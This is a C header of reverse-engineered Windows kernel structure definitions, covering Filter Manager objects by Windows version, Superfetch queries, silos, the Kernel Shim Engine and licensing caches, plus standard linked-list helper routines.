C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneBiasEffectiveStart) == 0x3c8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneBiasEffectiveEnd) == 0x3d0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, XState) == 0x3d8);

#endif /* __midl | MIDL_PASS */

/*
** KUSER_SHARED_DATA END
*/

/*
** MM UNLOADED DRIVERS START
*/

typedef struct _UNLOADED_DRIVERS {
    UNICODE_STRING Name;
    PVOID StartAddress;
    PVOID EndAddress;
    LARGE_INTEGER CurrentTime;
} UNLOADED_DRIVERS, *PUNLOADED_DRIVERS;

#define MI_UNLOADED_DRIVERS 50

/*
** MM UNLOADED DRIVERS END
*/


/*
** FLT MANAGER START
*/
typedef enum _FLT_FILTER_FLAGS {
    FLTFL_MANDATORY_UNLOAD_IN_PROGRESS = 1,
    FLTFL_FILTERING_INITIATED = 2,
    FLTFL_NAME_PROVIDER = 4,
    FLTFL_SUPPORTS_PIPES_MAILSLOTS = 8,
    FLTFL_BACKED_BY_PAGEFILE = 16,
    FLTFL_SUPPORTS_DAX_VOLUME = 32,
    FLTFL_SUPPORTS_WCOS = 64,
    FLTFL_FILTERS_READ_WRITE = 128,
} FLT_FILTER_FLAGS, *PFLT_FILTER_FLAGS;

typedef enum _FLT_OBJECT_FLAGS {
    FLT_OBFL_DRAINING = 1,
    FLT_OBFL_ZOMBIED = 2,
    FLT_OBFL_TYPE_INSTANCE = 0x1000000,
    FLT_OBFL_TYPE_FILTER = 0x2000000,
    FLT_OBFL_TYPE_VOLUME = 0x4000000,
} FLT_OBJECT_FLAGS, *PFLT_OBJECT_FLAGS;

typedef struct _FLT_OBJECT {
    ULONG Flags;
    ULONG PointerCount;
    EX_RUNDOWN_REF RundownRef;
    LIST_ENTRY PrimaryLink;
} FLT_OBJECT, *PFLT_OBJECT;

// Since w10 th1
typedef struct _FLT_OBJECT_V2 {
    ULONG Flags;
    ULONG PointerCount;
    EX_RUNDOWN_REF RundownRef;
    LIST_ENTRY PrimaryLink;
    GUID UniqueIdentifier;
} FLT_OBJECT_V2, *PFLT_OBJECT_V2; /* size: 0x0030 */

// Since w11 25h2
typedef struct _FLT_OBJECT_V3 {
    ULONG Flags;
    ULONG PointerCount;
    EX_RUNDOWN_REF RundownRef;
    LIST_ENTRY PrimaryLink;
    PVOID RundownLog;
    GUID UniqueIdentifier;
} FLT_OBJECT_V3, * PFLT_OBJECT_V3; /* size: 0x0038 */

typedef struct _FLT_OBJECT_LOG_ENTRY {
    ULONG Action;
    LONG Padding_25;
    EX_RUNDOWN_REF RundownRef;
    PVOID Stack[14];
} FLT_OBJECT_LOG_ENTRY, * PFLT_OBJECT_LOG_ENTRY; /* size: 0x0080 */

typedef struct _FLT_OBJECT_LOG {
    LONG Index;
    ULONG Reserved;
    FLT_OBJECT_LOG_ENTRY Log[1024];
} FLT_OBJECT_LOG, * PFLT_OBJECT_LOG; /* size: 0x20008 */

typedef struct _FLT_SERVER_PORT_OBJECT {
    LIST_ENTRY FilterLink;
    PVOID ConnectNotify;
    PVOID DisconnectNotify;
    PVOID MessageNotify;
    PVOID Filter;
    PVOID Cookie;
    ULONG Flags;
    LONG NumberOfConnections;
    LONG MaxConnections;
    LONG __PADDING__[1];
} FLT_SERVER_PORT_OBJECT, *PFLT_SERVER_PORT_OBJECT; /* size: 0x0048 */

typedef struct _FLT_RESOURCE_LIST_HEAD {
    ERESOURCE rLock;
    LIST_ENTRY rList;
    ULONG rCount;
    LONG __PADDING__[1];
} FLT_RESOURCE_LIST_HEAD, *PFLT_RESOURCE_LIST_HEAD; /* size: 0x0080 */

typedef struct _FLT_MUTEX_LIST_HEAD {
    FAST_MUTEX mLock;
    LIST_ENTRY mList;
    union {
        ULONG mCount;
        struct {
            UCHAR mInvalid : 1;
            CHAR __PADDING__[7];
        };
    }; 
} FLT_MUTEX_LIST_HEAD, *PFLT_MUTEX_LIST_HEAD; /* size: 0x0050 */

// Windows 7 version
typedef struct _FLT_FILTER_V1 {
    /* 0x0000 */ FLT_OBJECT Base;
    /* 0x0020 */ struct _FLTP_FRAME* Frame;
    /* 0x0028 */ UNICODE_STRING Name;
    /* 0x0038 */ UNICODE_STRING DefaultAltitude;
    /* 0x0048 */ FLT_FILTER_FLAGS Flags;
    /* 0x004c */ LONG Padding;
    /* 0x0050 */ DRIVER_OBJECT* DriverObject;
    /* 0x0058 */ FLT_RESOURCE_LIST_HEAD InstanceList;
    /* 0x00d8 */ struct FLT_VERIFIER_EXTENSION* VerifierExtension;
    /* 0x00e0 */ LIST_ENTRY VerifiedFiltersLink;
    /* 0x00f0 */ PVOID FilterUnload /* function */;
    /* 0x00f8 */ PVOID InstanceSetup /* function */;
    /* 0x0100 */ PVOID InstanceQueryTeardown /* function */;
    /* 0x0108 */ PVOID InstanceTeardownStart /* function */;
    /* 0x0110 */ PVOID InstanceTeardownComplete /* function */;
    /* 0x0118 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContextsListHead;
    /* 0x0120 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContexts[6];
    /* 0x0150 */ PVOID PreVolumeMount /* function */;
    /* 0x0158 */ PVOID PostVolumeMount /* function */;
    /* 0x0160 */ PVOID GenerateFileName /* function */;
    /* 0x0168 */ PVOID NormalizeNameComponent /* function */;
    /* 0x0170 */ PVOID NormalizeNameComponentEx /* function */;
    /* 0x0178 */ PVOID NormalizeContextCleanup /* function */;
    /* 0x0180 */ PVOID KtmNotification /* function */;
    /* 0x0188 */ struct _FLT_OPERATION_REGISTRATION* Operations;
    /* 0x0190 */ PVOID OldDriverUnload /* function */;
    /* 0x0198 */ FLT_MUTEX_LIST_HEAD ActiveOpens;
    /* 0x01e8 */ FLT_MUTEX_LIST_HEAD ConnectionList;
    /* 0x0238 */ FLT_MUTEX_LIST_HEAD PortList;
    /* 0x0288 */ EX_PUSH_LOCK PortLock;
} FLT_FILTER_V1, * PFLT_FILTER_V1; /* size: 0x0290 */

// Windows 8/8.1 version
typedef struct _FLT_FILTER_V2 {
    /* 0x0000 */ FLT_OBJECT Base;
    /* 0x0020 */ struct _FLTP_FRAME* Frame;
    /* 0x0028 */ UNICODE_STRING Name;
    /* 0x0038 */ UNICODE_STRING DefaultAltitude;
    /* 0x0048 */ FLT_FILTER_FLAGS Flags;
    /* 0x004c */ LONG Padding;
    /* 0x0050 */ DRIVER_OBJECT* DriverObject;
    /* 0x0058 */ FLT_RESOURCE_LIST_HEAD InstanceList;
    /* 0x00d8 */ struct _FLT_VERIFIER_EXTENSION* VerifierExtension;
    /* 0x00e0 */ LIST_ENTRY VerifiedFiltersLink;
    /* 0x00f0 */ PVOID FilterUnload /* function */;
    /* 0x00f8 */ PVOID InstanceSetup /* function */;
    /* 0x0100 */ PVOID InstanceQueryTeardown /* function */;
    /* 0x0108 */ PVOID InstanceTeardownStart /* function */;
    /* 0x0110 */ PVOID InstanceTeardownComplete /* function */;
    /* 0x0118 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContextsListHead;
    /* 0x0120 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContexts[7];
    /* 0x0158 */ PVOID PreVolumeMount /* function */;
    /* 0x0160 */ PVOID PostVolumeMount /* function */;
    /* 0x0168 */ PVOID GenerateFileName /* function */;
    /* 0x0170 */ PVOID NormalizeNameComponent /* function */;
    /* 0x0178 */ PVOID NormalizeNameComponentEx /* function */;
    /* 0x0180 */ PVOID NormalizeContextCleanup /* function */;
    /* 0x0188 */ PVOID KtmNotification /* function */;
    /* 0x0190 */ PVOID SectionNotification /* function */; //SINCE 8.1
    /* 0x0198 */ struct _FLT_OPERATION_REGISTRATION* Operations;
    /* 0x01a0 */ PVOID OldDriverUnload /* function */;
    /* 0x01a8 */ FLT_MUTEX_LIST_HEAD ActiveOpens;
    /* 0x01f8 */ FLT_MUTEX_LIST_HEAD ConnectionList;
    /* 0x0248 */ FLT_MUTEX_LIST_HEAD PortList;
    /* 0x0298 */ EX_PUSH_LOCK PortLock;
} FLT_FILTER_V2, * PFLT_FILTER_V2; /* size: 0x02a0 */

// Windows 10 version
typedef struct _FLT_FILTER_V3 {
    /* 0x0000 */ FLT_OBJECT_V2 Base;
    /* 0x0030 */ struct _FLTP_FRAME* Frame;
    /* 0x0038 */ UNICODE_STRING Name;
    /* 0x0048 */ UNICODE_STRING DefaultAltitude;
    /* 0x0058 */ FLT_FILTER_FLAGS Flags;
    /* 0x005c */ LONG Padding;
    /* 0x0060 */ DRIVER_OBJECT* DriverObject;
    /* 0x0068 */ FLT_RESOURCE_LIST_HEAD InstanceList;
    /* 0x00e8 */ struct _FLT_VERIFIER_EXTENSION* VerifierExtension;
    /* 0x00f0 */ LIST_ENTRY VerifiedFiltersLink;
    /* 0x0100 */ PVOID FilterUnload /* function */;
    /* 0x0108 */ PVOID InstanceSetup /* function */;
    /* 0x0110 */ PVOID InstanceQueryTeardown /* function */;
    /* 0x0118 */ PVOID InstanceTeardownStart /* function */;
    /* 0x0120 */ PVOID InstanceTeardownComplete /* function */;
    /* 0x0128 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContextsListHead;
    /* 0x0130 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContexts[7];
    /* 0x0168 */ PVOID PreVolumeMount /* function */;
    /* 0x0170 */ PVOID PostVolumeMount /* function */;
    /* 0x0178 */ PVOID GenerateFileName /* function */;
    /* 0x0180 */ PVOID NormalizeNameComponent /* function */;
    /* 0x0188 */ PVOID NormalizeNameComponentEx /* function */;
    /* 0x0190 */ PVOID NormalizeContextCleanup /* function */;
    /* 0x0198 */ PVOID KtmNotification /* function */;
    /* 0x01a0 */ PVOID SectionNotification /* function */;
    /* 0x01a8 */ struct _FLT_OPERATION_REGISTRATION* Operations;
    /* 0x01b0 */ PVOID OldDriverUnload /* function */;
    /* 0x01b8 */ FLT_MUTEX_LIST_HEAD ActiveOpens;
    /* 0x0208 */ FLT_MUTEX_LIST_HEAD ConnectionList;
    /* 0x0258 */ FLT_MUTEX_LIST_HEAD PortList;
    /* 0x02a8 */ EX_PUSH_LOCK PortLock;
} FLT_FILTER_V3, *PFLT_FILTER_V3; /* size: 0x02b0 */

// Windows 10/11+ (22000)
typedef struct _FLT_FILTER_V4 {
    /* 0x0000 */ FLT_OBJECT_V2 Base;
    /* 0x0030 */ struct _FLTP_FRAME* Frame;
    /* 0x0038 */ UNICODE_STRING Name;
    /* 0x0048 */ UNICODE_STRING DefaultAltitude;
    /* 0x0058 */ FLT_FILTER_FLAGS Flags;
    /* 0x005c */ LONG Padding;
    /* 0x0060 */ DRIVER_OBJECT* DriverObject;
    /* 0x0068 */ FLT_RESOURCE_LIST_HEAD InstanceList;
    /* 0x00e8 */ struct _FLT_VERIFIER_EXTENSION* VerifierExtension;
    /* 0x00f0 */ LIST_ENTRY VerifiedFiltersLink;
    /* 0x0100 */ PVOID FilterUnload /* function */;
    /* 0x0108 */ PVOID InstanceSetup /* function */;
    /* 0x0110 */ PVOID InstanceQueryTeardown /* function */;
    /* 0x0118 */ PVOID InstanceTeardownStart /* function */;
    /* 0x0120 */ PVOID InstanceTeardownComplete /* function */;
    /* 0x0128 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContextsListHead;
    /* 0x0130 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContexts[7];
    /* 0x0168 */ PVOID PreVolumeMount /* function */;
    /* 0x0170 */ PVOID PostVolumeMount /* function */;
    /* 0x0178 */ PVOID GenerateFileName /* function */;
    /* 0x0180 */ PVOID NormalizeNameComponent /* function */;
    /* 0x0188 */ PVOID NormalizeNameComponentEx /* function */;
    /* 0x0190 */ PVOID NormalizeContextCleanup /* function */;
    /* 0x0198 */ PVOID KtmNotification /* function */;
    /* 0x01a0 */ PVOID SectionNotification /* function */;
    /* 0x01a8 */ struct _FLT_OPERATION_REGISTRATION* Operations;
    /* 0x01b0 */ PVOID OldDriverUnload /* function */;
    /* 0x01b8 */ FLT_MUTEX_LIST_HEAD ActiveOpens;
    /* 0x0208 */ FLT_MUTEX_LIST_HEAD ConnectionList;
    /* 0x0258 */ FLT_MUTEX_LIST_HEAD PortList;
    /* 0x02a8 */ EX_PUSH_LOCK_AUTO_EXPAND PortLock;
} FLT_FILTER_V4, * PFLT_FILTER_V4; /* size: 0x02b8 */

// Windows 11+ (27XXX)
typedef struct _FLT_FILTER_V5 {
    /* 0x0000 */ FLT_OBJECT_V3 Base;
    /* 0x0038 */ struct _FLTP_FRAME* Frame;
    /* 0x0040 */ UNICODE_STRING Name;
    /* 0x0050 */ UNICODE_STRING DefaultAltitude;
    /* 0x0060 */ FLT_FILTER_FLAGS Flags;
    /* 0x0064 */ LONG Padding;
    /* 0x0068 */ DRIVER_OBJECT* DriverObject;
    /* 0x0070 */ FLT_RESOURCE_LIST_HEAD InstanceList;
    /* 0x00f0 */ struct _FLT_VERIFIER_EXTENSION* VerifierExtension;
    /* 0x00f8 */ LIST_ENTRY VerifiedFiltersLink;
    /* 0x0108 */ PVOID FilterUnload /* function */;
    /* 0x0110 */ PVOID InstanceSetup /* function */;
    /* 0x0118 */ PVOID InstanceQueryTeardown /* function */;
    /* 0x0120 */ PVOID InstanceTeardownStart /* function */;
    /* 0x0128 */ PVOID InstanceTeardownComplete /* function */;
    /* 0x0130 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContextsListHead;
    /* 0x0138 */ struct _ALLOCATE_CONTEXT_HEADER* SupportedContexts[7];
    /* 0x0170 */ PVOID PreVolumeMount /* function */;
    /* 0x0178 */ PVOID PostVolumeMount /* function */;
    /* 0x0180 */ PVOID GenerateFileName /* function */;
    /* 0x0188 */ PVOID NormalizeNameComponent /* function */;
    /* 0x0190 */ PVOID NormalizeNameComponentEx /* function */;
    /* 0x0198 */ PVOID NormalizeContextCleanup /* function */;
    /* 0x01a0 */ PVOID KtmNotification /* function */;
    /* 0x01a8 */ PVOID SectionNotification /* function */;
    /* 0x01b0 */ struct _FLT_OPERATION_REGISTRATION* Operations;
    /* 0x01b8 */ PVOID OldDriverUnload /* function */;
    /* 0x01c0 */ FLT_MUTEX_LIST_HEAD ActiveOpens;
    /* 0x0210 */ FLT_MUTEX_LIST_HEAD ConnectionList;
    /* 0x0260 */ FLT_MUTEX_LIST_HEAD PortList;
    /* 0x02b0 */ EX_PUSH_LOCK_AUTO_EXPAND PortLock;
} FLT_FILTER_V5, * PFLT_FILTER_V5; /* size: 0x02c0 */

typedef FLT_FILTER_V5 FLT_FILTER_COMPATIBLE;
typedef PFLT_FILTER_V5 PFLT_FILTER_COMPATIBLE;

/*
** FLT MANAGER END
*/

/*
** SUPERFETCH START
*/

#define SUPERFETCH_VERSION 45 // rev
#define SUPERFETCH_MAGIC ('kuhC') // rev

typedef enum _SUPERFETCH_INFORMATION_CLASS {
    SuperfetchRetrieveTrace = 1,
    SuperfetchSystemParameters = 2,
    SuperfetchLogEvent = 3,
    SuperfetchGenerateTrace = 4,
    SuperfetchPrefetch = 5,
    SuperfetchPfnQuery = 6,
    SuperfetchPfnSetPriority = 7,
    SuperfetchPrivSourceQuery = 8,
    SuperfetchSequenceNumberQuery = 9,
    SuperfetchScenarioPhase = 10,
    SuperfetchWorkerPriority = 11,
    SuperfetchScenarioQuery = 12,
    SuperfetchScenarioPrefetch = 13,
    SuperfetchRobustnessControl = 14,
    SuperfetchTimeControl = 15,
    SuperfetchMemoryListQuery = 16,
    SuperfetchMemoryRangesQuery = 17,
    SuperfetchTracingControl = 18,
    SuperfetchTrimWhileAgingControl = 19,
    SuperfetchInformationMax = 20
} SUPERFETCH_INFORMATION_CLASS;

typedef struct _SUPERFETCH_INFORMATION {
    ULONG Version;
    ULONG Magic;
    SUPERFETCH_INFORMATION_CLASS InfoClass;
    PVOID Data;
    ULONG Length;
} SUPERFETCH_INFORMATION, * PSUPERFETCH_INFORMATION;

typedef struct _PF_MEMORY_RANGE {
    ULONG_PTR BasePfn;
    ULONG_PTR PageCount;
} PF_MEMORY_RANGE, * PPF_MEMORY_RANGE;

typedef struct _PF_PHYSICAL_MEMORY_RANGE {
    ULONG_PTR BasePfn;
    ULONG_PTR PageCount;
} PF_PHYSICAL_MEMORY_RANGE, * PPF_PHYSICAL_MEMORY_RANGE;

typedef struct __declspec(align(8)) _PF_MEMORY_RANGE_INFO_V1 {
    ULONG Version;
    ULONG RangeCount;
    ULONG Reserved;
    PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
} PF_MEMORY_RANGE_INFO_V1, * PPF_MEMORY_RANGE_INFO_V1;

typedef struct __declspec(align(8))  _PF_MEMORY_RANGE_INFO_V2 {
    ULONG Version;
    ULONG Flags;
    ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
} PF_MEMORY_RANGE_INFO_V2, * PPF_MEMORY_RANGE_INFO_V2;

typedef struct _PF_MEMORY_RANGE_V2 {
    ULONG_PTR BasePfn;
    ULONG_PTR PageCount;
    ULONG_PTR Unknown;
} PF_MEMORY_RANGE_V2, * PPF_MEMORY_RANGE_V2;

typedef struct _MEMORY_FRAME_INFORMATION {
    ULONGLONG UseDescription : 4;
    ULONGLONG ListDescription : 3;
    ULONGLONG Reserved0 : 1;
    ULONGLONG Pinned : 1;
    ULONGLONG DontUse : 48;
    ULONGLONG Priority : 3;
    ULONGLONG Reserved : 4;
} MEMORY_FRAME_INFORMATION, * PMEMORY_FRAME_INFORMATION;

typedef struct _PAGEDIR_INFORMATION {
    ULONGLONG DontUse : 9;
    ULONGLONG PageDirectoryBase : 48;
    ULONGLONG Reserved : 7;
} PAGEDIR_INFORMATION, * PPAGEDIR_INFORMATION;

typedef struct _MMPFN_IDENTITY {
    union {
        MEMORY_FRAME_INFORMATION e1;
        PAGEDIR_INFORMATION e3;
    } u1;
    ULONG_PTR PageFrameIndex;
    union {
        struct {
            ULONG Image : 1;
            ULONG Mismatch : 1;
        } e1;
        PVOID FileObject;
        PVOID UniqueFileObjectKey;
        PVOID ProtoPteAddress;
        PVOID VirtualAddress;
    } u2;
} MMPFN_IDENTITY, * PMMPFN_IDENTITY;

typedef struct _SYSTEM_MEMORY_LIST_INFORMATION {
    SIZE_T ZeroPageCount;
    SIZE_T FreePageCount;
    SIZE_T ModifiedPageCount;
    SIZE_T ModifiedNoWritePageCount;
    SIZE_T BadPageCount;
    SIZE_T PageCountByPriority[8];
    SIZE_T RepurposedPagesByPriority[8];
    SIZE_T ModifiedPageCountPageFile;
} SYSTEM_MEMORY_LIST_INFORMATION, * PSYSTEM_MEMORY_LIST_INFORMATION;

typedef struct _PF_PFN_PRIO_REQUEST {
    ULONG Version;
    ULONG RequestFlags;
    ULONG_PTR PfnCount;
    SYSTEM_MEMORY_LIST_INFORMATION MemInfo;
    MMPFN_IDENTITY PageData[ANYSIZE_ARRAY];
} PF_PFN_PRIO_REQUEST, * PPF_PFN_PRIO_REQUEST;

typedef struct _SUPERFETCH_TRANSLATION_ENTRY {
    ULONG_PTR VirtualAddress;
    ULONG_PTR PhysicalAddress;
} SUPERFETCH_TRANSLATION_ENTRY, * PSUPERFETCH_TRANSLATION_ENTRY;

typedef struct _SUPERFETCH_MEMORY_MAP {
    PSUPERFETCH_TRANSLATION_ENTRY TranslationTable;
    ULONG_PTR TableSize;
    ULONG RangeCount;
} SUPERFETCH_MEMORY_MAP, * PSUPERFETCH_MEMORY_MAP;

/*
** SUPERFETCH END
*/

/*
** SILO START
*/

typedef struct _SYSTEM_ROOT_SILO_INFORMATION {
    ULONG NumberOfSilos;
    ULONG SiloIdList[1];
} SYSTEM_ROOT_SILO_INFORMATION, *PSYSTEM_ROOT_SILO_INFORMATION;

typedef struct _SILO_USER_SHARED_DATA {
    ULONG ServiceSessionId;
    ULONG ActiveConsoleId;
    LONGLONG ConsoleSessionForegroundProcessId;
    NT_PRODUCT_TYPE NtProductType;
    ULONG SuiteMask;
    ULONG SharedUserSessionId; // since RS2
    BOOLEAN IsMultiSessionSku;
    WCHAR NtSystemRoot[260];
    USHORT UserModeGlobalLogger[16];
    ULONG TimeZoneId; // since 21H2
    LONG TimeZoneBiasStamp;
    KSYSTEM_TIME TimeZoneBias;
    LARGE_INTEGER TimeZoneBiasEffectiveStart;
    LARGE_INTEGER TimeZoneBiasEffectiveEnd;
} SILO_USER_SHARED_DATA, *PSILO_USER_SHARED_DATA;

typedef struct _OBP_SYSTEM_DOS_DEVICE_STATE {
    ULONG GlobalDeviceMap;
    ULONG LocalDeviceCount[26];
} OBP_SYSTEM_DOS_DEVICE_STATE, *POBP_SYSTEM_DOS_DEVICE_STATE;

typedef struct _OBP_SILODRIVERSTATE {
    PDEVICE_MAP SystemDeviceMap;
    OBP_SYSTEM_DOS_DEVICE_STATE SystemDosDeviceState;
    EX_PUSH_LOCK DeviceMapLock;
    OBJECT_NAMESPACE_LOOKUPTABLE PrivateNamespaceLookupTable;
} OBP_SILODRIVERSTATE, *POBP_SILODRIVERSTATE;

typedef struct _OBP_SILODRIVERSTATE_V2 {
    EX_FAST_REF SystemDeviceMap;
    OBP_SYSTEM_DOS_DEVICE_STATE SystemDosDeviceState;
    EX_PUSH_LOCK DeviceMapLock;
    OBJECT_NAMESPACE_LOOKUPTABLE PrivateNamespaceLookupTable;
} OBP_SILODRIVERSTATE_V2, * POBP_SILODRIVERSTATE_V2; /* size: 0x02e0 */

//incomplete, values not important, change between versions.
typedef struct _ESERVERSILO_GLOBALS {
    OBP_SILODRIVERSTATE ObSiloState;
    //incomplete
} ESERVERSILO_GLOBALS, *PESERVERSILO_GLOBALS;

/*
** SILO END
*/

/*
** KSE START
*/

typedef enum _KSE_DISABLE_FLAGS {
    DisableNone = 0,
    DisableDriverShims = 1,
    DisableDeviceShims = 2,
    MaxDisableFlags
} KSE_DISABLE_FLAGS;

typedef enum _KSE_STATE {
    KseNotReady = 0,
    KseInProgress = 1,
    KseReady = 2
} KSE_STATE;

#define KseFlagsNone                0x0000
#define KseFlagsGroupPolicyOk       0x0002
#define KseFlagsVerifierEnabled     0x0040
#define KseFlagsNoDb                0x0080   
#define KseFlagsInitSafeMode        0x0100
#define KseFlagsDrvShimActive       0x0800
#define KseFlagsDevShimsActive      0x1000

#if _MSC_VER >= 1200
#pragma warning(push)
#pragma warning(disable:4324) // structure was padded due to __declspec(align())
#endif
typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT)_KSE_ENGINE {
    KSE_DISABLE_FLAGS DisableFlags;
    KSE_STATE State;
    ULONG Flags; //KseFlags*
    LIST_ENTRY ProvidersListHead;
    LIST_ENTRY ShimmedDriversListHead;
    PVOID KseGetIoCallbacksRoutine;
    PVOID KseSetCompletionHookRoutine;
    PVOID DeviceInfoCache;
    PVOID HardwareIdCache;
    PVOID ShimmedDriverHint;
} KSE_ENGINE, * PKSE_ENGINE;

#if _MSC_VER >= 1200
#pragma warning(pop)
#endif

typedef struct _KSE_SHIM {
    ULONG Size;
    GUID* Guid;
    PWCHAR Name;
    PVOID KseCallbackRoutines;
    PVOID RemoveNotificationRoutine;
    PVOID ApplyNotificationRoutine;
    PVOID HookCollectionsArray;
} KSE_SHIM, * PKSE_SHIM;

typedef enum _KSE_HOOK_COLLECTION_TYPE {
    HookNtOsImport = 0,
    HookHalImport = 1,
    HookNamedModuleImports = 2,
    HookCallbacks = 3,
    HookLastCollection = 4
} KSE_HOOK_COLLECTION_TYPE;

typedef struct _KSE_HOOK_COLLECTION {
    KSE_HOOK_COLLECTION_TYPE Type;
    PWCHAR TargetDriverName;
    PVOID HookArray;
} KSE_HOOK_COLLECTION, * PKSE_HOOK_COLLECTION;

typedef enum _KSE_HOOK_TYPE {
    HookFunction = 0,
    HookIrpCallback = 1,
    HookLast = 2
} KSE_HOOK_TYPE, * PKSE_HOOK_TYPE;

typedef struct _KSE_HOOK {
    KSE_HOOK_TYPE Type;
    union {
        PCHAR FunctionName;
        ULONG CallbackId;
    } DUMMYUNION;
    PVOID HookFunction;
    PVOID OriginalFunction;
} KSE_HOOK, * PKSE_HOOK;

typedef struct _KSE_PROVIDER {
    LIST_ENTRY ProviderList;
    PKSE_SHIM Shim;
} KSE_PROVIDER, * PKSE_PROVIDER;

typedef struct _KSE_SHIMMED_DRIVER {
    LIST_ENTRY ListEntry;
    PVOID DriverBaseAddress;
    ULONG RefCount;
    GUID* ShimGuid;
    //incomplete
} KSE_SHIMMED_DRIVER, * PKSE_SHIMMED_DRIVER;

/*
** KSE END
*/

/*
** SOFTWARE LICENSING START
*/
#pragma pack(push, 1)
typedef struct _SL_CACHE_VALUE_DESCRIPTOR {
    USHORT Size;
    USHORT NameLength;
    USHORT Type;
    USHORT DataLength;
    ULONG Attributes;
    ULONG Reserved;
    WCHAR Name[ANYSIZE_ARRAY];
} SL_CACHE_VALUE_DESCRIPTOR, *PSL_CACHE_VALUE_DESCRIPTOR;
typedef SL_CACHE_VALUE_DESCRIPTOR SL_KMEM_CACHE_VALUE_DESCRIPTOR;
#pragma pack(pop)

typedef struct _SL_CACHE {
    ULONG TotalSize;
    ULONG SizeOfData;
    ULONG SignatureSize;
    ULONG Flags;
    ULONG Version;
    SL_KMEM_CACHE_VALUE_DESCRIPTOR Descriptors[ANYSIZE_ARRAY];
} SL_CACHE, *PSL_CACHE;
typedef SL_CACHE SL_KMEM_CACHE;

typedef struct _SL_APPX_CACHE_VALUE_DESCRIPTOR {
    UCHAR HashedName[32];
    ULONGLONG Expiration;
    ULONG DataSize;
    WCHAR Name[ANYSIZE_ARRAY];
} SL_APPX_CACHE_VALUE_DESCRIPTOR, *PSL_APPX_CACHE_VALUE_DESCRIPTOR;

typedef struct _SL_APPX_CACHE {
    ULONG Version;
    ULONG Flags;
    ULONG DataSize;
    ULONGLONG DataCheckSum;
    SL_APPX_CACHE_VALUE_DESCRIPTOR Descriptors[ANYSIZE_ARRAY];
} SL_APPX_CACHE, *PSL_APPX_CACHE;


/*
** SOFTWARE LICENSING END
*/

/*
** List Entry macro START (wdm.h)
*/

#if defined (NTOS_ENABLE_LIST_ENTRY_MACRO)

#define InitializeListHead32(ListHead) (\
    (ListHead)->Flink = (ListHead)->Blink = PtrToUlong((ListHead)))

FORCEINLINE
VOID
InitializeListHead(
    _Out_ PLIST_ENTRY ListHead
)
{
    ListHead->Flink = ListHead->Blink = ListHead;
    return;
}

_Must_inspect_result_
BOOLEAN
CFORCEINLINE
IsListEmpty(
    _In_ const LIST_ENTRY* ListHead
)
{
    return (BOOLEAN)(ListHead->Flink == ListHead);
}

FORCEINLINE
BOOLEAN
RemoveEntryList(
    _In_ PLIST_ENTRY Entry
)
{
    PLIST_ENTRY Blink;
    PLIST_ENTRY Flink;

    Flink = Entry->Flink;
    Blink = Entry->Blink;
    Blink->Flink = Flink;
    Flink->Blink = Blink;
    return (BOOLEAN)(Flink == Blink);
}

FORCEINLINE
PLIST_ENTRY
RemoveHeadList(
    _Inout_ PLIST_ENTRY ListHead
)
{
    PLIST_ENTRY Flink;
    PLIST_ENTRY Entry;

    Entry = ListHead->Flink;
    Flink = Entry->Flink;
    ListHead->Flink = Flink;
    Flink->Blink = ListHead;
    return Entry;
}

FORCEINLINE
PLIST_ENTRY
RemoveTailList(
    _Inout_ PLIST_ENTRY ListHead
)
{
    PLIST_ENTRY Blink;
    PLIST_ENTRY Entry;

    Entry = ListHead->Blink;
    Blink = Entry->Blink;
    ListHead->Blink = Blink;
    Blink->Flink = ListHead;
    return Entry;
}

FORCEINLINE
VOID
InsertTailList(
    _Inout_ PLIST_ENTRY ListHead,
    _Inout_ __drv_aliasesMem PLIST_ENTRY Entry
)
{
    PLIST_ENTRY Blink;

    Blink = ListHead->Blink;
    Entry->Flink = ListHead;
    Entry->Blink = Blink;
    Blink->Flink = Entry;
    ListHead->Blink = Entry;
    return;
}

FORCEINLINE
VOID
InsertHeadList(
    _Inout_ PLIST_ENTRY ListHead,
    _Inout_ __drv_aliasesMem PLIST_ENTRY Entry
)
{
    PLIST_ENTRY Flink;

    Flink = ListHead->Flink;
    Entry->Flink = Flink;
    Entry->Blink = ListHead;
    Flink->Blink = Entry;
    ListHead->Flink = Entry;
    return;
}

FORCEINLINE
VOID
AppendTailList(
    _Inout_ PLIST_ENTRY ListHead,
    _Inout_ PLIST_ENTRY ListToAppend
)
{
    PLIST_ENTRY ListEnd = ListHead->Blink;

    ListHead->Blink->Flink = ListToAppend;
    ListHead->Blink = ListToAppend->Blink;
    ListToAppend->Blink->Flink = ListHead;
    ListToAppend->Blink = ListEnd;
    return;
}

FORCEINLINE
PSINGLE_LIST_ENTRY
PopEntryList(
    _Inout_ PSINGLE_LIST_ENTRY ListHead
)
{
    PSINGLE_LIST_ENTRY FirstEntry;

    FirstEntry = ListHead->Next;
    if (FirstEntry != NULL) {
        ListHead->Next = FirstEntry->Next;
    }

    return FirstEntry;
}

FORCEINLINE
VOID
PushEntryList(
    _Inout_ PSINGLE_LIST_ENTRY ListHead,
    _Inout_ __drv_aliasesMem PSINGLE_LIST_ENTRY Entry
)
{
    Entry->Next = ListHead->Next;
    ListHead->Next = Entry;
    return;
}

#define ASSERT_LIST_ENTRY_VALID(ListEntry) {                    \
    if (ListEntry == NULL)                                      \
        return;                                                 \
    if (ListEntry->Flink == NULL || ListEntry->Blink == NULL)   \
        return;                                                 \
}

#define ASSERT_LIST_ENTRY_VALID_ERROR_X(ListEntry, X) {         \
    if (ListEntry == NULL)                                      \
        return X;                                               \
    if (ListEntry->Flink == NULL || ListEntry->Blink == NULL)   \
        return X;                                               \
}

#define ASSERT_LIST_ENTRY_VALID_BOOLEAN(ListEntry) ASSERT_LIST_ENTRY_VALID_ERROR_X(ListEntry, FALSE)

